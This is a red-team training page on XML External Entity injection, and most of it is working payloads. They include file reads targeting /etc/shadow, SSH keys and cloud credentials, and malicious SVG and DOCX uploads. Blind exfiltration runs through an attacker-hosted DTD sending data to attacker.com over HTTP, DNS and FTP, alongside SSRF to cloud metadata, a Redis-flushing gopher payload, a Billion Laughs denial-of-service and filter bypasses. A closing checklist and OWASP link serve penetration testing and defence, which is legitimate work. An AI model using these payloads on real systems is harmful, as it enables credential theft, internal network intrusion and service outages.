---
layout: training-page
title: "XXE Injection — Red Team Academy"
module: "Web Hacking"
tags:
  - xxe
  - xml
  - oob-xxe
  - blind-xxe
  - dtd
  - ssrf-chaining
page_key: "web-xxe"
render_with_liquid: false
---

# XXE Injection

XML External Entity (XXE) injection abuses the XML parser's ability to reference external resources. XXE reads local files, performs SSRF to internal services, and in some configurations leads to blind data exfiltration via DNS/HTTP. Common in SOAP services, file upload parsers (SVG, DOCX, XLSX), and any application accepting XML input.

## Basic XXE — File Read

```
# Inject external entity definition and reference it in element:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>

# Windows targets:
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>

# Common sensitive files:
# /etc/passwd, /etc/shadow, /etc/hostname, /etc/hosts
# /proc/self/environ, /proc/version, /proc/cmdline
# ~/.ssh/id_rsa, ~/.bash_history, ~/.aws/credentials
# /var/www/html/config.php, application config files

# Test in Burp: change Content-Type to application/xml if JSON
# Many APIs also accept XML: try both JSON and XML bodies
```

## XXE via File Upload

```
# SVG file upload (SVG is XML — processed server-side):
# Upload malicious .svg:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>

# DOCX / XLSX (ZIP archives containing XML):
# Unzip the file, inject into word/document.xml or xl/workbook.xml:
mkdir docx_xxe && cp file.docx docx_xxe/
cd docx_xxe && unzip ../file.docx
# Edit word/document.xml — add entity declaration in DOCTYPE
# Rezip: zip -r malicious.docx *
# Upload and trigger processing

# PPTX, ODT, ODP — same approach (ZIP + XML)

# PDF with embedded XML (XMP metadata):
# Inject XXE in PDF XMP metadata block
```

## Blind XXE — OOB via HTTP

When output isn't reflected — use out-of-band techniques to exfiltrate data via HTTP/DNS.

```
# Step 1: Check for HTTP callback (use Burp Collaborator or interactsh):
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://BURP-COLLAB.burpcollaborator.net/test">]>
<foo>&xxe;</foo>

# Step 2: Exfiltrate file content via external DTD:
# Host malicious DTD on your server (evil.dtd):
cat > /var/www/html/evil.dtd << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;
EOF

# Payload to send to target:
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>
<foo>test</foo>

# File content arrives at your server in the GET request:
# GET /?data=root:x:0:0:root:/root:/bin/bash... HTTP/1.1
```

## Blind XXE via DNS (Exfil in Subdomain)

```
# Exfiltrate via DNS lookup (works through strict HTTP firewalls):
# Host evil.dtd:
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; dns SYSTEM 'http://%file;.attacker.com/'>">
%eval;
%dns;

# Hostname appears as subdomain in DNS lookup
# Limit: DNS labels max 63 chars, multi-line files need encoding

# Base64 encoded exfil via parameter entity:
# Use PHP wrapper if available:
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
```

## XXE via Error Messages

```
# If app returns XML parsing errors with content:
# Trigger error with file path as entity:
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>

# Error message: "File not found: root:x:0:0:root..."
# File content embedded in error → error-based blind XXE
```

## XXE to SSRF

```
# Use http:// scheme to reach internal services:
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<foo>&xxe;</foo>

# Scan internal ports via XXE:
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://192.168.1.1:22">]>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://192.168.1.1:3306">]>

# XXE + Gopher for Redis/memcached:
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A">]>
```

## XXE Filter Bypass

```
# If DOCTYPE is blocked but XML is accepted:
# Use local DTD (leverage existing DTD on system):
<?xml version="1.0"?>
<!DOCTYPE foo SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd" [
  <!ENTITY % xxe "%local_dtd;">
]>

# UTF-16 encoding bypass:
# Convert payload to UTF-16 — some filters only check UTF-8
# python3: open('payload.xml','w',encoding='utf-16').write(payload)

# CDATA bypass for special characters in file content:
<!ENTITY % start "<![CDATA[">
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % end "]]>">
<!ENTITY &#x25; xxe "&start;&file;&end;">
```

## XXE Payload Library

Extended payload variants from PayloadsAllTheThings for different injection contexts.

### Classic XXE Variants

```
<!-- One-liner: -->
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>

<!-- Structured form: -->
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ELEMENT data (#ANY)>
  <!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>&file;</data>

<!-- Base64 encoded file read (PHP wrapper): -->
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<data>&file;</data>

<!-- XInclude (when DOCTYPE is not allowed but XInclude is parsed): -->
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</foo>
```

### XXE Billion Laughs DoS

```
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

## Blind XXE Techniques

Out-of-band exfiltration and error-based extraction from PayloadsAllTheThings.

### OOB via External DTD (HTTP exfil)

```
<!-- Payload sent to target: -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<foo>test</foo>

<!-- evil.dtd hosted on attacker.com: -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>">
%eval;
%exfil;
```

### Error-Based XXE (Local DTD Repurposing)

```
<!-- Linux systems have DTD files that can be repurposed -->
<!-- Technique: redefine an entity from an existing system DTD -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
  <!ENTITY % expr 'aaa)>
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; err SYSTEM &#x27;file:///nonexistent/%file;&#x27;>">
    &#x25;eval;
    &#x25;err;
    <!ELEMENT aa (bb'>
  %local_dtd;
]>
<foo></foo>

<!-- Common local DTDs on Linux: -->
<!-- /usr/share/xml/fontconfig/fonts.dtd -->
<!-- /usr/share/yelp/dtd/docbookx.dtd -->
<!-- /usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd -->
```

### OOB via Apache Karaf / FTP

```
<!-- Some parsers support ftp:// for binary file exfil (bypasses line-break limits): -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://attacker.com:2121/%file;'>">
%eval;
%exfil;
<!-- Run: python3 -m pyftpdlib -p 2121 on attacker machine to receive -->
```

## XXE via File Upload

Extended file format targeting from PayloadsAllTheThings.

```
<!-- SVG XXE (upload as profile picture or document): -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg" height="200" width="200">
  <text y="20">&xxe;</text>
</svg>

<!-- SOAP / XML API endpoint injection: -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<soap:Envelope>
  <soap:Body>&xxe;</soap:Body>
</soap:Envelope>

<!-- DOCX / XLSX injection via ZIP manipulation: -->
<!-- Unzip .docx, inject into word/document.xml DOCTYPE, rezip -->
unzip file.docx -d docx_extracted/
# Edit docx_extracted/word/document.xml — add DOCTYPE with XXE entity
cd docx_extracted/ && zip -r ../malicious.docx .

<!-- XLSX — inject into xl/workbook.xml -->
<!-- PPTX, ODT, ODP — same ZIP + XML approach -->

<!-- JSON to XML bypass — if API accepts both formats: -->
# Change Content-Type: application/json to Content-Type: application/xml
# Rewrite body from JSON to XML with XXE DOCTYPE
```

### WAF Bypass — Character Encoding

```
<!-- UTF-16 encoding (bypass UTF-8-only WAF filters): -->
# Convert payload to UTF-16:
python3 -c "
payload = '''<?xml version=\"1.0\" encoding=\"UTF-16\"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>'''
open('payload_utf16.xml','w',encoding='utf-16').write(payload)
"

<!-- CDATA wrapping for special chars in exfil data: -->
<!ENTITY % start "<![CDATA[">
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % end "]]>">
<!ENTITY &#x25; xxe "%start;%file;%end;">
```

## XXE Detection Checklist

Systematically identify every XML processing surface and test whether the parser has dangerous features enabled. Missing any one control enables the attack.

```
# Step 1: Find all XML processing surfaces
# - Explicit XML endpoints (Content-Type: application/xml, text/xml)
# - SOAP endpoints (Content-Type: text/xml, SOAPAction header)
# - File upload endpoints accepting: .xml, .svg, .docx, .xlsx, .pptx, .odt, .odf
# - APIs that return XML (try changing Accept: application/xml)
# - APIs accepting JSON — try switching to XML:
#   Change Content-Type: application/json → application/xml
#   Convert body: {"key":"value"} → <key>value</key>

# Step 2: Test for external entity processing (basic file read)
# If this returns /etc/passwd contents = classic XXE:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<test>&xxe;</test>

# Step 3: Test for external DTD loading (blind XXE indicator)
# Set up listener: nc -lvnp 9090
# Send payload — if server makes outbound request = external DTD loading enabled:
<?xml version="1.0"?>
<!DOCTYPE test SYSTEM "http://YOUR_SERVER:9090/detect.dtd">
<test>value</test>

# Step 4: Test for SSRF via XXE
# Classic SSRF targets from XXE:
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin">
<!ENTITY xxe SYSTEM "http://internal.corp.com/api/v1/users">

# Step 5: Test error-based XXE (when no direct output)
# Trigger parser error that includes file content in error message:
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///invalid/%file;'>">
  %eval;
  %error;
]>

# Step 6: Test XInclude (when you can't control DOCTYPE)
# Works in contexts where only element values are parsed, not full DOCTYPE:
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>

# Step 7: Check which parser security features are disabled
# Indicators of missing protections (from OWASP matrix):
# DOCTYPE not disabled  → standard XXE works
# External entities enabled → SSRF + file read
# External DTD loading → blind XXE via callback
# No expansion limits  → Billion Laughs DoS possible
# XInclude enabled     → file disclosure without DOCTYPE

# Billion Laughs DoS test (CAREFUL — this can crash parsers):
# <!DOCTYPE lolz [
#   <!ENTITY lol "lol">
#   <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
#   <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
#   ... (up to lol9)
# ]>

# Step 8: SVG and Office XML specific testing
# SVG upload: upload this file as avatar/profile image:
# <?xml version="1.0" encoding="UTF-8"?>
# <!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
# <svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>

# DOCX injection:
# 1. unzip document.docx -d docx_dir
# 2. Edit word/document.xml — add DOCTYPE with entity before <w:document>
# 3. zip -r modified.docx docx_dir/
# 4. Upload modified.docx — if server extracts and parses XML = XXE

# Summary: what to check at each step:
# [ ] Can inject DOCTYPE declaration?
# [ ] Are external entities resolved? (basic file read test)
# [ ] Does parser make outbound HTTP/DNS requests? (blind XXE)
# [ ] Are error messages verbose enough for error-based extraction?
# [ ] Does XInclude work without DOCTYPE?
# [ ] Are file upload endpoints accepting XML-based formats?
```

## Tools & Resources

- PortSwigger XXE labs — `portswigger.net/web-security/xxe`
- PayloadsAllTheThings XXE — `github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection`
- XXEinjector — `github.com/enjoiz/XXEinjector`
- Burp Suite Pro — active scan detects XXE
- DTD cheat sheet — `dtd.io`
- OWASP XXE Prevention Cheat Sheet — `cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html`
